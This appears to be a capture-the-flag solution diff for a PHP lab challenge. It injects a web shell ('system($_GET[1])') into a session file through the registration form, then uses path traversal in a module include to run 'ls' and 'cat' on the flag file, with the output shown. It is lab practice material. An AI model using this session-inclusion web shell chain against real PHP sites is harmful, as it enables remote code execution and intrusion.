@@ -1,0 +1,24 @@
+http://csie.ctf.tw:10141/
+    ?action=register
+
+    POST: user=<?php system($_GET[1]); ?>
+
+cookie: PHPSESSID 97v0it0kr0po126qjeji1j4502
+
+-------------------------------------------------------------------------------
+
+http://csie.ctf.tw:10141/
+    ?action=module
+    &m=../../../../var/lib/php/session/sess_97v0it0kr0po126qjeji1j4502
+    &1=ls /
+
+user|s:26:"bin boot dev etc flag-66666666666 home lib lib64 media mnt opt proc root sbin selinux srv sys tmp usr var ";
+
+-------------------------------------------------------------------------------
+
+http://csie.ctf.tw:10141/
+    ?action=module
+    &m=../../../../var/lib/php/session/sess_97v0it0kr0po126qjeji1j4502
+    &1=cat /flag-66666666666
+
+user|s:26:"FLAG{sess_easylfi} ";
